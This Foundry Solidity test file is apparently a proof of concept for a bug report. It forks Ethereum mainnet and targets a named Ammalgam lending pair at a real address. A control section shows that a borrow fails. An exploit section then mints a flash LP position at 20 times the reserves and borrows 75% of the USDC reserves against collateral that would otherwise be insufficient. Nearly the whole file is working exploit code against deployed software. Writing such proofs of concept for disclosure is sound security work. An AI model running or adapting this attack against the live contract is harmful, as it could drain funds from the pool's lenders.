// SPDX-License-Identifier: MIT
pragma solidity ^0.8.34;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

interface IAmmalgamPair {
    function mint(address to) external returns (uint256);
    function burn(address to) external returns (uint256, uint256);
    function deposit(address to) external;
    function borrow(address to, uint256 amountXAssets, uint256 amountYAssets, bytes calldata data) external;
    function tokens(uint256 tokenType) external view returns (address);
    function getReserves() external view returns (uint112, uint112, uint32);
    function externalLiquidity() external view returns (uint112);
}

interface IWETH {
    function deposit() external payable;
}

contract FlashLpCleanTest is Test {
    address constant PAIR = 0x728fD0A966B993fe518B00122D51e494F99aBd6a;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    IAmmalgamPair pair = IAmmalgamPair(PAIR);

    function _zeroExtLiq() internal {
        uint256 target = uint256(pair.externalLiquidity());
        for (uint256 slot; slot < 200; slot++) {
            bytes32 raw = vm.load(PAIR, bytes32(slot));
            if (uint256(raw) == target || (uint256(raw) & type(uint112).max) == target) {
                uint256 cleared = uint256(raw) == target ? 0 : (uint256(raw) & ~uint256(type(uint112).max));
                vm.store(PAIR, bytes32(slot), bytes32(cleared));
                if (pair.externalLiquidity() == 0) return;
                vm.store(PAIR, bytes32(slot), raw);
            }
        }
        revert("slot not found");
    }

    function test_differential_flashLp_enables_borrow() public {
        vm.createSelectFork(vm.envOr("ETH_RPC_URL", string("https://mainnet.gateway.tenderly.co")));
        _zeroExtLiq();
        assertEq(pair.externalLiquidity(), 0);

        (uint112 rx, uint112 ry,) = pair.getReserves();
        uint256 borrowUsdc = uint256(rx) * 75 / 100;
        uint256 coll = (uint256(ry) * borrowUsdc / uint256(rx)) * 250 / 100;
        uint256 flashX = uint256(rx) * 20;
        uint256 flashY = uint256(ry) * 20;

        // --- Control ---
        {
            address attacker = makeAddr("ctrl");
            _collateral(attacker, coll);
            vm.prank(attacker);
            try pair.borrow(attacker, borrowUsdc, 0, "") {
                revert("control borrow should fail");
            } catch {
                console2.log("PASS control: borrow reverted without flash LP");
            }
        }

        // --- Exploit ---
        address attacker = makeAddr("atk");
        address helper = makeAddr("hlp");
        deal(USDC, helper, flashX);
        _fundWeth(helper, flashY);
        _collateral(attacker, coll);

        vm.startPrank(helper);
        IERC20(USDC).transfer(PAIR, flashX);
        IERC20(WETH).transfer(PAIR, flashY);
        uint256 lp;
        try pair.mint(helper) returns (uint256 s) {
            lp = s;
            console2.log("mint ok", lp);
        } catch (bytes memory r) {
            console2.log("mint revert");
            console2.logBytes(r);
            revert("mint failed");
        }
        vm.stopPrank();

        uint256 before = IERC20(USDC).balanceOf(attacker);
        vm.prank(attacker);
        try pair.borrow(attacker, borrowUsdc, 0, "") {
            console2.log("PASS exploit: borrow succeeded", IERC20(USDC).balanceOf(attacker) - before);
        } catch (bytes memory r) {
            console2.log("borrow revert");
            console2.logBytes(r);
            revert("borrow failed");
        }

        assertEq(IERC20(USDC).balanceOf(attacker) - before, borrowUsdc);
        assertGt(IERC20(pair.tokens(4)).balanceOf(attacker), 0);

        // Try remove flash LP (best-effort; sat brick is a separate issue)
        vm.startPrank(helper);
        IERC20(pair.tokens(0)).transfer(PAIR, lp);
        try pair.burn(helper) {
            console2.log("burn ok");
        } catch (bytes memory r) {
            console2.log("burn revert (sat/utilization)");
            console2.logBytes(r);
        }
        vm.stopPrank();
    }

    function _collateral(address who, uint256 wethAmt) internal {
        _fundWeth(who, wethAmt);
        vm.startPrank(who);
        IERC20(WETH).transfer(PAIR, wethAmt);
        pair.deposit(who);
        vm.stopPrank();
    }

    function _fundWeth(address to, uint256 amount) internal {
        vm.deal(to, amount);
        vm.prank(to);
        IWETH(WETH).deposit{value: amount}();
    }
}
